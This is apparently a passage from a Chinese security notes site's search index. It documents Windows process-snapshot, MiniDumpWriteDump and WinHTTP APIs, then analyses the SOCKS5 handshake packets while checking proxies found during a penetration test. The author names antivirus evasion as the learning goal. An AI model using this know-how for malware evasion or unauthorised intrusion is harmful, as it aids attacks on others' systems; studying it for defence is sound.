CreateToolhelp32Snapshot"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#process32first","text":"BOOL Process32First( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); hSnapshot \u5feb\u7167\u53e5\u67c4\uff0c\u7531CreateToolhelp32napshot\u8fd4\u56de lppe \u6307\u5411PROCESSENTRY32\u7ed3\u6784\u3002\u8be5\u7ed3\u6784\u7528\u4e8e\u4fdd\u5b58\u8fdb\u7a0b\u4fe1\u606f\uff0c\u5728\u8fdb\u884c\u8be5\u51fd\u6570\u524d\uff0cPROCESSENTRY32\u7684dwSize\u5c5e\u6027\u5fc5\u987b\u5b9a\u4e49\u597d\u3002","title":"\u68c0\u7d22\u5feb\u7167\u4e2d\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a Process32First"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#process32next","text":"BOOL Process32Next( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); hSnapshot \u5feb\u7167\u53e5\u67c4\uff0c\u7531CreateToolhelp32napshot\u8fd4\u56de lppe \u6307\u5411PROCESSENTRY32\u7ed3\u6784\u3002\u8be5\u7ed3\u6784\u7528\u4e8e\u4fdd\u5b58\u8fdb\u7a0b\u4fe1\u606f\uff0c\u5728\u8fdb\u884c\u8be5\u51fd\u6570\u524d\uff0cPROCESSENTRY32\u7684dwSize\u5c5e\u6027\u5fc5\u987b\u5b9a\u4e49\u597d\u3002","title":"\u68c0\u7d22\u5feb\u7167\u4e2d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f: Process32Next"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#minidumpwritedump","text":"\u5934\u6587\u4ef6 DbgHelp.h BOOL MiniDumpWriteDump( HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam ); hProcess \u8fdb\u7a0b\u53e5\u67c4 processid \u8fdb\u7a0b\u7684PID hFile \u6587\u4ef6\u53e5\u67c4\uff0c\u6307\u5b9a\u5199\u5165\u90a3\u4e2a\u6587\u4ef6 DumpType \u6307\u5b9a\u4ee5\u4f55\u79cd\u5f62\u5f0f\u5199\u5165\u6587\u4ef6\uff0c\u53c2\u6570\u53c2\u8003: https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type ExceptionParam \u6307\u9488\uff0c\u6307\u5411 MINIDUMP_EXCEPTION_INFORMATION \u7ed3\u6784\u7528\u4e8e\u63cf\u8ff0\u53d1\u751f\u7684\u5f02\u5e38\u3002\u5982\u679c\u4e3aNULL\uff0c\u5219\u8868\u793a\u8f6c\u50a8\u6587\u4ef6\u4e2d\u4e0d\u5305\u542b\u5f02\u5e38\u4fe1\u606f UserStreamParam \u6307\u9488\uff0c\u6307\u5411 MINIDUMP_USER_STREAM_INFORMATION \u7ed3\u6784\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4fdd\u5b58\u7528\u6237\u6570\u636e\u6d41\u4fe1\u606f\u3002\u4e00\u822c\u7f6eNULL CallbackParam \u6307\u9488\uff0c\u6307\u5411 MINIDUMP_CALLBACK_INFORMATION \u7ed3\u6784\uff0c\u8be5\u7ed3\u6784\u4fdd\u5b58\u56de\u8c03\u51fd\u6570\u7684\u4fe1\u606f\uff0c\u4e00\u822c\u7f6eNULL","title":"\u5c06\u67d0\u4e2a\u8fdb\u7a0b\u8f6c\u50a8\u4e3a\u5feb\u7167\u5199\u5165\u6587\u4ef6: MiniDumpWriteDump"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#httpwinhttph","text":"\u5927\u6d41\u7a0b","title":"HTTP\u8bf7\u6c42\uff0c\u591a\u6570\u51fd\u6570\u5305\u542b\u5728winhttp.h\u4e2d"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpopen-winhttp-session","text":"WINHTTPAPI HINTERNET WinHttpOpen( LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags ); pszAgentW \u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a\u5b57\u7b26\u4e32.\u8be5\u5b57\u7b26\u4e32\u5728http\u901a\u4fe1\u4e2d\u88ab\u7528\u4f5cuser agent dwAccessType http\u8bf7\u6c42\u65b9\u5f0f\uff0c\u5176\u503c\u6709\u5982\u4e0b\uff0c\u4e3b\u8981\u662f\u4ee3\u7406\u76f8\u5173 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY WINHTTP_ACCESS_TYPE_NAMED_PROXY WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY WINHTTP_ACCESS_TYPE_NO_PROXY \u4e0d\u4f7f\u7528\u4ee3\u7406\u8fdb\u884c\u901a\u8baf pszProxyW \u6307\u9488\uff0c\u5f53dwAccessType\u4e3a WINHTTP_ACCESS_TYPE_NAMED_PROXY \u65f6\u6307\u5411\u4ee3\u7406\u670d\u52a1\u5668\u540d\u5b57\u3002\u5426\u5219\u53d6 WINHTTP_NO_PROXY_NAME \u503c pszProxyBypassW \u6307\u9488\uff0c\u6307\u5411\u5b57\u7b26\u4e32\uff0c \u5f53dwAccessType\u4e3a WINHTTP_ACCESS_TYPE_NAMED_PROXY \u65f6\u6307\u5411\u4e0d\u60f3\u8d70\u4ee3\u7406\u7684IP\u5730\u5740\u6216\u4e3b\u673a\u540d\u3002\u5426\u5219\u53d6 WINHTTP_NO_PROXY_BYPASS \u503c dwFlags \u4e00\u822c\u53d60","title":"winhttpopen:\u8fd4\u56de WinHTTP-session \u53e5\u67c4"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpconnect-handle-to-an-http-session-for-that-initial-target","text":"WINHTTPAPI HINTERNET WinHttpConnect( HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved ); hSession WinHttpOpen \u65b9\u6cd5\u8fd4\u56de\u7684\u53e5\u67c4 pswzServerName \u6307\u9488\uff0c\u6307\u5411\u9700\u8981\u8bf7\u6c42\u7684\u670d\u52a1\u5668\u7684IP\u6216\u4e3b\u673a\u540d\u7684\u5b57\u7b26\u4e32 nServerPort \u6307\u5b9a\u8bf7\u6c42\u7aef\u53e3 dwReserved \u7f6e0","title":"WinHttpConnect \uff1a\u8fd4\u56de \u94fe\u63a5 \u53e5\u67c4\uff08 handle to an HTTP session for that initial target. \uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpopenrequest-http","text":"WINHTTPAPI HINTERNET WinHttpOpenRequest( HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags ); hConnect WinHttpConnect\u8fd4\u56de\u7684\u53e5\u67c4 pwszVerb \u6307\u5b9aHTTP\u8bf7\u6c42\u65b9\u6cd5 pwszObjectName \u6307\u5b9a\u8bf7\u6c42\u8d44\u6e90\u7684\u8def\u5f84 pwszVersion \u6307\u5b9aHTTP\u7248\u672c pwszReferrer \u591a\u6570\u60c5\u51b5\u53ef\u8bbe\u7f6e\u4e3a WINHTTP_NO_REFERER ppwszAcceptTypes \u6307\u5b9a\u5a92\u4f53\u7c7b\u578b\uff0c\u53ef\u8bbe\u7f6e\u4e3a WINHTTP_DEFAULT_ACCEPT_TYPES dwFlags \u901a\u5e38\u7f6e0","title":"WinHttpOpenRequest \uff1a\u521b\u5efaHTTP\u8bf7\u6c42\u53e5\u67c4"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpaddrequestheaders-http","text":"BOOLAPI WinHttpAddRequestHeaders( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers ); hRequest WinHttpOpenRequest\u8fd4\u56de\u7684\u53e5\u67c4 lpszHeaders \u6307\u5411\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff0c\u5b57\u7b26\u4e32\u91cc\u5305\u542b\u4e86\u8981\u9644\u52a0\u5230http\u8bf7\u6c42\u4e0a\u7684\u5934\u90e8\u4fe1\u606f\u3002\u6bcf\u4e2a\u5934\u90e8\u4e4b\u95f4\u7528 CR/LF \u9694\u5f00 dwHeadersLength \u5934\u90e8\u7684\u957f\u5ea6 dwModifiers \u4e00\u4e9b\u529f\u80fd\u4fee\u9970\uff0c\u4e00\u822c\u53ef\u4ee5\u7f6e WINHTTP_ADDREQ_FLAG_ADD","title":"WinHttpAddRequestHeaders \u8bbe\u7f6eHTTP\u5934"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpsendrequest-http","text":"BOOLAPI WinHttpSendRequest( HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext ); hRequest WinHttpOpenRequest\u8fd4\u56de\u7684\u53e5\u67c4 lpszHeaders \u9644\u52a0\u7684HTTP\u5934\uff0c\u5982\u679c\u6ca1\u6709\u60f3\u9644\u52a0\u7684\u5934\u5c31\u7f6e0 dwHeadersLength lpszHeaders \u6307\u5b9a\u7684\u5934\u7684\u5b57\u7b26\u4e32\u5927\u5c0f lpOptional \u4e00\u4e2a\u6307\u9488\u3002\u6307\u5411\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u5f53\u4e2d\u5305\u62ec\u53ef\u9009\u7684\u6570\u636e\u53d1\u9001\u540e\uff0c\u9a6c\u4e0a\u8bf7\u6c42\u6807\u5934\u3002\u8be5\u53c3\u6570\u901a\u7ecf\u5e38\u4f7f\u7528\u4e8ePOST\u548cPUT\u64cd\u4f5c\u3002 \uff08\u6211\u7406\u89e3\u4e3a\u4f20\u7684\u53c2\u6570\uff09 dwOptionalLength \u989d\u5916\u5185\u5bb9\u7684\u957f\u5ea6 dwTotalLength \u603b\u957f\u5ea6 dwContext \u901a\u5e38\u7f6e0","title":"WinHttpSendRequest \u53d1\u9001HTTP\u8bf7\u6c42"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpreceiveresponse-http","text":"WINHTTPAPI BOOL WinHttpReceiveResponse( HINTERNET hRequest, LPVOID lpReserved ); hRequest WinHttpOpenRequest \u8fd4\u56de\u7684\u53e5\u67c4 lpReserved \u7f6eNULL \u4e3b\u8981\u4f5c\u7528\u662f\u5982\u679c\u6709\u56de\u5e94\uff0c\u5219\u4f1a\u8fd4\u56detrue\u3002","title":"WinHttpReceiveResponse \uff1a\u7b49\u5f85http\u56de\u5e94"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpquerydataavailable-http","text":"BOOLAPI WinHttpQueryDataAvailable( HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable ); lpdwNumberOfBytesAvailable \u7f6eNULL\uff0c\u5176\u7528\u6765\u63a5\u6536\u5185\u5bb9\u957f\u5ea6","title":"WinHttpQueryDataAvailable \uff1a\u8fd4\u56deHTTP\u56de\u5e94\u5185\u5bb9\u7684\u5927\u81f4\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#winhttpreaddata-http","text":"BOOLAPI WinHttpReadData( HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead ); lpBuffer \u6307\u5b9a\u4e00\u7247\u7f13\u51b2\u533a\uff0c\u56de\u5e94\u7684\u6570\u636e\u4f1a\u5b58\u653e\u5230\u6b64\u5904 dwNumberOfBytesToRead \u7f13\u51b2\u533a\u5927\u5c0f\u957f\u5ea6 lpdwNumberOfBytesRead \u7528\u4e8e\u5b58\u50a8\u56de\u5e94\u7684\u5b57\u8282\u6570\uff0c\u5728\u4f7f\u7528\u8be5\u51fd\u6570\u65f6\u8be5\u503c\u987b\u4e3aNULL \u8bf4\u767d\u4e86\uff0c\u5c31\u662f\u4ee5C\u6216c++\u7b49\u8bed\u8a00\u4e3a\u8f7d\u4f53\uff0c\u8c03\u7528\u5404\u79cdWindows API\u5b8c\u6210\u7f16\u7a0b \u5b66\u8fd9\u4e2a\u7684\u76ee\u7684\u662f\u56e0\u4e3a\u8981\u63a5\u89e6\u514d\u6740\uff0c\u9700\u8981\u66f4\u6df1\u5c42\u6b21\u7684\u4e86\u89e3Windows\u7684\u4e00\u4e9b\u673a\u5236\u3002","title":"WinHttpReadData \u8bfb\u53d6HTTP\u56de\u5e94\u5185\u5bb9"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#com","text":"","title":"COM\u76f8\u5173"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#coinitializeex-com","text":"HRESULT CoInitializeEx( LPVOID pvReserved, DWORD dwCoInit ); pvReserved \u5fc5\u987b\u586bNULL dwCoInit \u521d\u59cb\u5316\u9009\u9879\uff1a COINIT_APARTMENTTHREADED Initializes the thread for apartment-threaded object concurrency (see Remarks).\uff08\u542f\u52a8\u5355\u7ebf\u7a0b\u5bf9\u8c61\uff09 COINIT_MULTITHREADED Initializes the thread for multithreaded object concurrency (see Remarks).\uff08\u542f\u52a8\u591a\u7ebf\u7a0b\u5bf9\u8c61\uff09 COINIT_DISABLE_OLE1DDE Disables DDE for OLE1 support. COINIT_SPEED_OVER_MEMORY Increase memory usage in an attempt to increase performance.","title":"CoInitializeEx \uff1a\u521b\u5efaCOM\u73af\u5883"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#_5","text":"","title":"\u4e00\u4e9b\u6570\u636e\u7c7b\u578b"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#ntstatus","text":"NTSTATUS\u662f\u7528\u4e8e\u7cfb\u7edf\u63d0\u4f9b\u7684\u72b6\u6001\u7801\u503c\u7684\u6807\u51c632\u4f4d\u6570\u636e\u7c7b\u578b\u3002 STATUS_SEVERITY_SUCCESS0x0 Success STATUS_SEVERITY_INFORMATIONAL0x1 Informational STATUS_SEVERITY_WARNING0x2 Warning STATUS_SEVERITY_ERROR0x3 Error","title":"NTSTATUS"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#hresult","text":"\u7528\u4e8e\u63cf\u8ff0\u9519\u8bef\u6216\u8b66\u544a\u768432\u4f4d\u503c\u3002","title":"HRESULT"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/","text":"\u7f51\u7edc\u534f\u8bae websocket \u957f\u94fe\u63a5 socks5","title":"\u7f51\u7edc\u534f\u8bae"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/#_1","text":"websocket \u957f\u94fe\u63a5 socks5","title":"\u7f51\u7edc\u534f\u8bae"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/socks5/socks5/","text":"socks5 \u76ee\u5f55 \u5224\u65adsocks5\u94fe\u63a5\u53ef\u7528\u6027 curl\u6cd5 \u6570\u636e\u5305\u5206\u6790 \u6293\u5305\u5206\u6790\uff1aTCP\u4e09\u6b21\u63e1\u624b \u6293\u5305\u5206\u6790\uff1aclient\uff0c\u8bf7\u6c42\u8ba4\u8bc1 \u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u8ba4\u8bc1 \u6293\u5305\u5206\u6790\uff1aclient\uff0c\u53d1\u9001\u5730\u5740\u8bf7\u6c42 \u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u5730\u5740\u8bf7\u6c42 \u6293\u5305\u5206\u6790\u603b\u7ed3 \u811a\u672c\u7f16\u5199 \u5224\u65adsocks5\u94fe\u63a5\u53ef\u7528\u6027 curl\u6cd5 curl --socks5 \u4f60\u7684\u4ee3\u7406IP:\u7aef\u53e3\u53f7 https://www.example.com \u539f\u59cb\u65b9\u6cd5 \u6570\u636e\u5305\u5206\u6790 ref\uff1a\u6293\u5305\u5206\u6790\uff1a https://zgao.top/\u5947\u5b89\u4fe1\u5b9e\u4e60\u4e94-socks5\u534f\u8bae\u6293\u5305\u5206\u6790/ https://www.quarkay.com/code/383/socks5-protocol-rfc-chinese-traslation https://samsclass.info/122/proj/how-socks5-works.html \u6e17\u900f\u7684\u65f6\u5019\uff0c\u626b\u63cf\u626b\u5230\u4e86\u4e00\u6279socks5\u94fe\u63a5\u3002 \u60f3\u9a8c\u8bc1\u4ed6\u4eec\u7684\u53ef\u7528\u6027\u65f6\uff0c\u9047\u5230\u4e86\u5982\u4e0b\u95ee\u9898 socks5 \u94fe\u63a5\u662f\u5426\u771f\u7684\u662fsocks5\uff1f socks5 \u94fe\u63a5\u80fd\u901a\u54ea\u4e9b\u7f51\u7edc\uff08\u516c\u7f51\uff1f10\u6bb5\uff1f172\u6bb5\uff1f\uff09 socks5 \u662f\u5426\u9700\u8981\u5bc6\u7801\uff1f \u4e8e\u662f\u6253\u7b97\u901a\u8fc7\u6570\u636e\u5305\u5206\u6790\u6765\u597d\u597d\u9a8c\u8bc1socks5\u7684\u53ef\u7528\u6027 \u6293\u5305\u5206\u6790\uff1aTCP\u4e09\u6b21\u63e1\u624b \u5728\u5f00\u59cbsocks5\u4e4b\u524d\uff0c\u4f1a\u8fdb\u884c\u4e09\u6b21\u63e1\u624b \u6293\u5305\u5206\u6790\uff1aclient\uff0c\u8bf7\u6c42\u8ba4\u8bc1 VER \uff08\u7248\u672c\uff09\u5b57\u6bb5\u5728\u6b64\u7248\u672c\u4e2d\u8bbe\u7f6e\u4e3a X\u201905\u2018 NMETHODS \uff08\u65b9\u6cd5\u6570\u76ee\uff09\u5b57\u6bb5\u5305\u542b\u4e86 METHODS \uff08\u65b9\u6cd5\u5217\u8868\uff09\u4e2d\u6240\u5305\u542b\u7684\u65b9\u6cd5\u8bc6\u522b\u7801\u7684\u4e2a\u6570\u3002 METHODS\u5982\u4e0b\u8868 X\u201900\u2018\u3000\u3000\u65e0\u9700\u8ba4\u8bc1 X\u201901\u2018\u3000\u3000GSSAPI X\u201902\u2018\u3000\u3000\u7528\u6237\u540d/\u5bc6\u7801 X\u201903\u2018\u3000\u5230\u3000X\u20197F\u2019\u3000\u3000IANA \u6307\u5b9a X\u201980\u2018\u3000\u5230\u3000X\u2019FE\u2019\u3000\u3000\u4e3a\u79c1\u6709\u65b9\u6cd5\u4fdd\u7559 X\u2019FF\u2018\u3000\u3000\u65e0\u53ef\u63a5\u53d7\u65b9\u6cd5 \u5982\u4e0b\u4fbf\u662f \u65b9\u6cd5\u6570\u76ee\u4e3a1\uff0c\u4e14\u65b9\u6cd5\u4e3a \u65e0\u9700\u8ba4\u8bc1\uff0800\uff09\u7684client\u8bf7\u6c42\u8ba4\u8bc1\u5305 \u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u8ba4\u8bc1 VER \uff08\u7248\u672c\uff09\u5b57\u6bb5\u5728\u6b64\u7248\u672c\u4e2d\u8bbe\u7f6e\u4e3a X\u201905\u2018 METHOD\u8868\u793a\u4ece\u8bf7\u6c42\u8ba4\u8bc1\u4e2d\uff0c\u9009\u62e9\u4e00\u4e2a\u65b9\u6cd5\u4f5c\u4e3a\u8ba4\u8bc1\uff08\u5982\u679c METHOD \uff08\u65b9\u6cd5\uff09\u5b57\u6bb5\u4e3a X\u2019FF\u2018\uff0c \u8868\u793a\u65b9\u6cd5\u5217\u8868\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u5747\u4e0d\u53ef\u7528\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u6b64\u4fe1\u606f\u5fc5\u987b\u5173\u95ed\u8fde\u63a5\u3002\uff09 0500\u8868\u793a\u63a5\u53d7client\u7684\u65e0\u9700\u8ba4\u8bc1\u7684\u8ba4\u8bc1\u8bf7\u6c42\uff0c0500\u540e\u9762\u7684\u662f\u586b\u5145padding\uff0c\u4e0d\u7ba1\u3002 \u6293\u5305\u5206\u6790\uff1aclient\uff0c\u53d1\u9001\u5730\u5740\u8bf7\u6c42 VER\u3000\u534f\u8bae\u7248\u672c\uff1a X\u201805\u2019 CMD\u3000\u547d\u4ee4 CONNECT\u3000\u8fde\u63a5\uff0c X\u201801\u2019 BIND\u3000\u76d1\u542cX\u201802\u2019 UDP ASSOCIATE\u3000UDP\u5173\u8054 X\u201803\u2019 RSV\u3000\u4fdd\u7559\u5b57\u6bb5 ATYP\u3000\u5730\u5740\u7c7b\u578b IPV4\u3000X\u201801\u2019 \u57df\u540d\u3000X\u201803\u2019 IPV6\u3000X\u201804\u2019 DST.ADDR\u3000\u76ee\u6807\u5730\u5740 DST.PORT\u3000\u76ee\u6807\u7aef\u53e3 \uff08\u7f51\u7edc\u5b57\u8282\u5e8f\uff09 \u6293\u5230\u7684\u5305 05:ver 01:CMD\u2192connect 00: \u4fdd\u7559 01: \u5730\u5740\u7c7b\u578b IPV4 17f000001: \u8981\u4ee3\u7406\u7684\u5730\u5740\uff08\u6211\u8fd9\u91cc\u8bf7\u6c42\u7684\u662f127.0.0.1\uff09 006e \uff1a\u8981\u4ee3\u7406\u7684\u5730\u5740\u7684\u7aef\u53e3\uff08\u6211\u8fd9\u91cc\u8bf7\u6c42\u7684\u662f110\uff0c6e\u7684\u8f6c10\u8fdb\u5236\u5c31\u662f110\uff09 \u6293\u5305\u5206\u6790\uff1aserver\uff0c\u54cd\u5e94\u5730\u5740\u8bf7\u6c42 VER\u534f\u8bae\u7248\u672c\uff1a\u3000X\u201805\u2019 REP \u56de\u590d\u5b57\u6bb5\uff08\u56de\u590d\u7c7b\u578b\uff09\uff1a X\u201800\u2019\u3000\u6210\u529f X\u201801\u2019\u3000\u5e38\u89c4 SOCKS \u670d\u52a1\u6545\u969c X\u201802\u2019\u3000\u89c4\u5219\u4e0d\u5141\u8bb8\u7684\u8fde\u63a5 X\u201803\u2019\u3000\u7f51\u7edc\u4e0d\u53ef\u8fbe X\u201804\u2019\u3000\u4e3b\u673a\u65e0\u6cd5\u8bbf\u95ee X\u201805\u2019\u3000\u62d2\u7edd\u8fde\u63a5 X\u201806\u2019\u3000\u8fde\u63a5\u8d85\u65f6 X\u201807\u2019\u3000\u4e0d\u652f\u6301\u7684\u547d\u4ee4 X\u201808\u2019\u3000\u4e0d\u652f\u6301\u7684\u5730\u5740\u7c7b\u578b X\u201809\u2019\u3000\u5230\u3000X\u2019FF\u2019\u3000\u672a\u5b9a\u4e49 RSV\u3000\u4fdd\u7559\u5b57\u6bb5 ATYP\u3000\u5730\u5740\u7c7b\u578b IPV4\u3000X\u201801\u2019 \u57df\u540d\u3000X\u201803\u2019 IPV6\u3000X\u201804\u2019 BND.ADDR\u3000\u670d\u52a1\u7aef\u7ed1\u5b9a\u5730\u5740 